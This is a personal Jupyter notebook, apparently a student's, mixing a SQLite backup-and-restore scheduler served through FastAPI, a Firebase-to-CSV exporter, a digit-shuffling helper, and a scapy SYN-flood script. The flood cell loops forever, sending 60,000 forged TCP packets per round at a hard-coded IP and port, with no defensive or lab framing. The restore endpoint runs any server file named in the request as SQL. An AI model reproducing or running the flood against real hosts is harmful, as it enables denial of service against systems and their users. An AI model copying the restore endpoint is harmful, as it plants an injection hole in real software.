{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting schedule\n",
      "  Obtaining dependency information for schedule from https://files.pythonhosted.org/packages/20/a7/84c96b61fd13205f2cafbe263cdb2745965974bdf3e0078f121dfeca5f02/schedule-1.2.2-py3-none-any.whl.metadata\n",
      "  Downloading schedule-1.2.2-py3-none-any.whl.metadata (3.8 kB)\n",
      "Downloading schedule-1.2.2-py3-none-any.whl (12 kB)\n",
      "Installing collected packages: schedule\n",
      "Successfully installed schedule-1.2.2\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: Ignoring invalid distribution -pencv-python (c:\\users\\abbas\\.conda\\envs\\uni\\lib\\site-packages)\n",
      "WARNING: Ignoring invalid distribution -pencv-python (c:\\users\\abbas\\.conda\\envs\\uni\\lib\\site-packages)\n"
     ]
    }
   ],
   "source": [
    "pip install schedule"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import time\n",
    "import schedule\n",
    "import sqlite3\n",
    "from datetime import datetime\n",
    "from sqlalchemy import create_engine, MetaData\n",
    "from sqlalchemy.orm import sessionmaker\n",
    "\n",
    "DATABASE_URL = \"sqlite:///./temp.db\"  # Update this URL to match your database\n",
    "BACKUP_DIR = 'backups'\n",
    "\n",
    "def get_engine():\n",
    "    return create_engine(DATABASE_URL)\n",
    "\n",
    "def backup_table(engine, table_name):\n",
    "    timestamp = datetime.now().strftime(\"%Y%m%d%H%M%S\")\n",
    "    backup_file = os.path.join(BACKUP_DIR, f\"{table_name}_backup_{timestamp}.sql\")\n",
    "\n",
    "    with sqlite3.connect(engine.url.database) as conn:\n",
    "        with open(backup_file, 'w') as f:\n",
    "            for line in conn.iterdump():\n",
    "                if line.startswith(f'INSERT INTO \"{table_name}\"'):\n",
    "                    f.write(f'{line}\\n')\n",
    "\n",
    "    print(f\"Backup for table {table_name} created at {backup_file}\")\n",
    "\n",
    "def backup_database():\n",
    "    if not os.path.exists(BACKUP_DIR):\n",
    "        os.makedirs(BACKUP_DIR)\n",
    "\n",
    "    engine = get_engine()\n",
    "    metadata = MetaData(bind=engine)\n",
    "    metadata.reflect()\n",
    "\n",
    "    for table_name in metadata.tables.keys():\n",
    "        backup_table(engine, table_name)\n",
    "\n",
    "schedule.every(5).minutes.do(backup_database)\n",
    "\n",
    "def run_scheduler():\n",
    "    while True:\n",
    "        schedule.run_pending()\n",
    "        time.sleep(1)\n",
    "\n",
    "def restore_table(engine, table_name, backup_file):\n",
    "    with sqlite3.connect(engine.url.database) as conn:\n",
    "        cursor = conn.cursor()\n",
    "        \n",
    "        # Remove existing data from the table\n",
    "        cursor.execute(f'DELETE FROM \"{table_name}\";')\n",
    "        \n",
    "        # Restore data from the backup file\n",
    "        with open(backup_file, 'r') as f:\n",
    "            sql_script = f.read()\n",
    "            conn.executescript(sql_script)\n",
    "\n",
    "    print(f\"Data for table {table_name} restored from {backup_file}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "ename": "RuntimeError",
     "evalue": "asyncio.run() cannot be called from a running event loop",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mRuntimeError\u001b[0m                              Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[5], line 30\u001b[0m\n\u001b[0;32m     28\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;18m__name__\u001b[39m \u001b[38;5;241m==\u001b[39m \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m__main__\u001b[39m\u001b[38;5;124m\"\u001b[39m:\n\u001b[0;32m     29\u001b[0m     \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01muvicorn\u001b[39;00m\n\u001b[1;32m---> 30\u001b[0m     \u001b[43muvicorn\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mrun\u001b[49m\u001b[43m(\u001b[49m\u001b[43mapp\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mhost\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43m0.0.0.0\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mport\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43mint\u001b[39;49m\u001b[43m(\u001b[49m\u001b[43mos\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mgetenv\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43mPORT\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;241;43m3000\u001b[39;49m\u001b[43m)\u001b[49m\u001b[43m)\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[1;32mc:\\Users\\abbas\\.conda\\envs\\Uni\\lib\\site-packages\\uvicorn\\main.py:587\u001b[0m, in \u001b[0;36mrun\u001b[1;34m(app, host, port, uds, fd, loop, http, ws, ws_max_size, ws_max_queue, ws_ping_interval, ws_ping_timeout, ws_per_message_deflate, lifespan, interface, reload, reload_dirs, reload_includes, reload_excludes, reload_delay, workers, env_file, log_config, log_level, access_log, proxy_headers, server_header, date_header, forwarded_allow_ips, root_path, limit_concurrency, backlog, limit_max_requests, timeout_keep_alive, timeout_graceful_shutdown, ssl_keyfile, ssl_certfile, ssl_keyfile_password, ssl_version, ssl_cert_reqs, ssl_ca_certs, ssl_ciphers, headers, use_colors, app_dir, factory, h11_max_incomplete_event_size)\u001b[0m\n\u001b[0;32m    585\u001b[0m     Multiprocess(config, target\u001b[38;5;241m=\u001b[39mserver\u001b[38;5;241m.\u001b[39mrun, sockets\u001b[38;5;241m=\u001b[39m[sock])\u001b[38;5;241m.\u001b[39mrun()\n\u001b[0;32m    586\u001b[0m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[1;32m--> 587\u001b[0m     \u001b[43mserver\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mrun\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m    588\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m config\u001b[38;5;241m.\u001b[39muds \u001b[38;5;129;01mand\u001b[39;00m os\u001b[38;5;241m.\u001b[39mpath\u001b[38;5;241m.\u001b[39mexists(config\u001b[38;5;241m.\u001b[39muds):\n\u001b[0;32m    589\u001b[0m     os\u001b[38;5;241m.\u001b[39mremove(config\u001b[38;5;241m.\u001b[39muds)  \u001b[38;5;66;03m# pragma: py-win32\u001b[39;00m\n",
      "File \u001b[1;32mc:\\Users\\abbas\\.conda\\envs\\Uni\\lib\\site-packages\\uvicorn\\server.py:61\u001b[0m, in \u001b[0;36mServer.run\u001b[1;34m(self, sockets)\u001b[0m\n\u001b[0;32m     59\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mrun\u001b[39m(\u001b[38;5;28mself\u001b[39m, sockets: Optional[List[socket\u001b[38;5;241m.\u001b[39msocket]] \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;01mNone\u001b[39;00m) \u001b[38;5;241m-\u001b[39m\u001b[38;5;241m>\u001b[39m \u001b[38;5;28;01mNone\u001b[39;00m:\n\u001b[0;32m     60\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mconfig\u001b[38;5;241m.\u001b[39msetup_event_loop()\n\u001b[1;32m---> 61\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43masyncio\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mrun\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mserve\u001b[49m\u001b[43m(\u001b[49m\u001b[43msockets\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43msockets\u001b[49m\u001b[43m)\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[1;32mc:\\Users\\abbas\\.conda\\envs\\Uni\\lib\\asyncio\\runners.py:33\u001b[0m, in \u001b[0;36mrun\u001b[1;34m(main, debug)\u001b[0m\n\u001b[0;32m      9\u001b[0m \u001b[38;5;250m\u001b[39m\u001b[38;5;124;03m\"\"\"Execute the coroutine and return the result.\u001b[39;00m\n\u001b[0;32m     10\u001b[0m \n\u001b[0;32m     11\u001b[0m \u001b[38;5;124;03mThis function runs the passed coroutine, taking care of\u001b[39;00m\n\u001b[1;32m   (...)\u001b[0m\n\u001b[0;32m     30\u001b[0m \u001b[38;5;124;03m    asyncio.run(main())\u001b[39;00m\n\u001b[0;32m     31\u001b[0m \u001b[38;5;124;03m\"\"\"\u001b[39;00m\n\u001b[0;32m     32\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m events\u001b[38;5;241m.\u001b[39m_get_running_loop() \u001b[38;5;129;01mis\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m:\n\u001b[1;32m---> 33\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mRuntimeError\u001b[39;00m(\n\u001b[0;32m     34\u001b[0m         \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124masyncio.run() cannot be called from a running event loop\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n\u001b[0;32m     36\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m coroutines\u001b[38;5;241m.\u001b[39miscoroutine(main):\n\u001b[0;32m     37\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mValueError\u001b[39;00m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124ma coroutine was expected, got \u001b[39m\u001b[38;5;132;01m{!r}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;241m.\u001b[39mformat(main))\n",
      "\u001b[1;31mRuntimeError\u001b[0m: asyncio.run() cannot be called from a running event loop"
     ]
    }
   ],
   "source": [
    "import threading\n",
    "from fastapi import FastAPI, HTTPException\n",
    "\n",
    "app = FastAPI()\n",
    "\n",
    "@app.on_event(\"startup\")\n",
    "def startup_event():\n",
    "    backup_thread = threading.Thread(target=run_scheduler)\n",
    "    backup_thread.start()\n",
    "\n",
    "@app.post(\"/restore-table/\")\n",
    "async def restore_table_endpoint(table_name: str, backup_file: str):\n",
    "    engine = get_engine()\n",
    "    if not os.path.exists(backup_file):\n",
    "        raise HTTPException(status_code=404, detail=\"Backup file not found\")\n",
    "    \n",
    "    try:\n",
    "        restore_table(engine, table_name, backup_file)\n",
    "    except Exception as e:\n",
    "        raise HTTPException(status_code=500, detail=str(e))\n",
    "    \n",
    "    return {\"message\": f\"Table {table_name} restored successfully from {backup_file}\"}\n",
    "\n",
    "@app.get(\"/\")\n",
    "async def root():\n",
    "    return {\"message\": \"Hello World\"}\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    import uvicorn\n",
    "    uvicorn.run(app, host=\"0.0.0.0\", port=int(os.getenv(\"PORT\", 3000)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: scapy in c:\\users\\abbas\\.conda\\envs\\uni\\lib\\site-packages (2.4.3)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: Ignoring invalid distribution -pencv-python (c:\\users\\abbas\\.conda\\envs\\uni\\lib\\site-packages)\n",
      "WARNING: Ignoring invalid distribution -pencv-python (c:\\users\\abbas\\.conda\\envs\\uni\\lib\\site-packages)\n"
     ]
    }
   ],
   "source": [
    "pip install scapy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "\n",
    "def syn_flood(target_ip, target_port, packet_count):\n",
    "    for _ in range(packet_count):\n",
    "        ip = IP(dst=target_ip)\n",
    "        tcp = TCP(dport=target_port, flags=\"SAF\")\n",
    "        pkt = ip / tcp\n",
    "        send(pkt, verbose=False)\n",
    "    print(f\"Sent {packet_count} SYN packets to {target_ip}:{target_port}\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    while True:\n",
    "        target_ip = \"192.168.18.220\"  # Replace with your target IP\n",
    "        target_port = 8000  # Replace with your target port\n",
    "        packet_count = 60000  # Number of packets to send\n",
    "\n",
    "        syn_flood(target_ip, target_port, packet_count)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def compress_its(its: int) -> str:\n",
    "    its = str(its)\n",
    "    if len(its) == 11:\n",
    "        indices = [6, 5, 2, 7, 4, 0, 9, 8]\n",
    "        compressed_its = ''.join(its[i] for i in indices)\n",
    "        return compressed_its\n",
    "    return its\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Exception ignored in: <function SuperSocket.__del__ at 0x000001B8D9BE3DC0>\n",
      "Traceback (most recent call last):\n",
      "  File \"c:\\Users\\abbas\\.conda\\envs\\Uni\\lib\\site-packages\\scapy\\supersocket.py\", line 134, in __del__\n",
      "    self.close()\n",
      "  File \"c:\\Users\\abbas\\.conda\\envs\\Uni\\lib\\site-packages\\scapy\\arch\\windows\\native.py\", line 190, in close\n",
      "    self.ins.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)\n",
      "AttributeError: 'L3WinSocket' object has no attribute 'ins'\n"
     ]
    },
    {
     "ename": "TypeError",
     "evalue": "object of type 'int' has no len()",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[4], line 1\u001b[0m\n\u001b[1;32m----> 1\u001b[0m \u001b[43mcompress_its\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;241;43m734960436221\u001b[39;49m\n\u001b[0;32m      2\u001b[0m \u001b[43m             \u001b[49m\u001b[43m)\u001b[49m\n",
      "Cell \u001b[1;32mIn[3], line 2\u001b[0m, in \u001b[0;36mcompress_its\u001b[1;34m(its)\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mcompress_its\u001b[39m(its: \u001b[38;5;28mstr\u001b[39m) \u001b[38;5;241m-\u001b[39m\u001b[38;5;241m>\u001b[39m \u001b[38;5;28mstr\u001b[39m:\n\u001b[1;32m----> 2\u001b[0m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28;43mlen\u001b[39;49m\u001b[43m(\u001b[49m\u001b[43mits\u001b[49m\u001b[43m)\u001b[49m \u001b[38;5;241m==\u001b[39m \u001b[38;5;241m11\u001b[39m:\n\u001b[0;32m      3\u001b[0m         indices \u001b[38;5;241m=\u001b[39m [\u001b[38;5;241m6\u001b[39m, \u001b[38;5;241m5\u001b[39m, \u001b[38;5;241m2\u001b[39m, \u001b[38;5;241m7\u001b[39m, \u001b[38;5;241m4\u001b[39m, \u001b[38;5;241m0\u001b[39m, \u001b[38;5;241m9\u001b[39m, \u001b[38;5;241m8\u001b[39m]\n\u001b[0;32m      4\u001b[0m         compressed_its \u001b[38;5;241m=\u001b[39m \u001b[38;5;124m'\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;241m.\u001b[39mjoin(its[i] \u001b[38;5;28;01mfor\u001b[39;00m i \u001b[38;5;129;01min\u001b[39;00m indices)\n",
      "\u001b[1;31mTypeError\u001b[0m: object of type 'int' has no len()"
     ]
    }
   ],
   "source": [
    "compress_its(734960436221)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import firebase_admin\n",
    "from firebase_admin import credentials, db\n",
    "import csv\n",
    "\n",
    "# Initialize Firebase Admin SDK\n",
    "cred = credentials.Certificate('path/to/serviceAccountKey.json')\n",
    "firebase_admin.initialize_app(cred, {\n",
    "    'databaseURL': 'https://your-database-name.firebaseio.com/'\n",
    "})\n",
    "\n",
    "def fetch_data_from_firebase():\n",
    "    # Reference to your database\n",
    "    ref = db.reference('path/to/your/data')\n",
    "    return ref.get()\n",
    "\n",
    "def save_data_to_csv(data, file_name):\n",
    "    # Extract headers from data keys\n",
    "    headers = set()\n",
    "    for entry in data.values():\n",
    "        headers.update(entry.keys())\n",
    "    headers = sorted(headers)\n",
    "\n",
    "    # Write data to CSV\n",
    "    with open(file_name, mode='w', newline='') as csv_file:\n",
    "        writer = csv.DictWriter(csv_file, fieldnames=headers)\n",
    "        writer.writeheader()\n",
    "        for key, value in data.items():\n",
    "            writer.writerow(value)\n",
    "\n",
    "def main():\n",
    "    # Fetch data from Firebase\n",
    "    data = fetch_data_from_firebase()\n",
    "    if data:\n",
    "        # Save data to CSV\n",
    "        save_data_to_csv(data, 'firebase_data.csv')\n",
    "        print(\"Data saved to firebase_data.csv\")\n",
    "    else:\n",
    "        print(\"No data found in Firebase.\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Uni",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
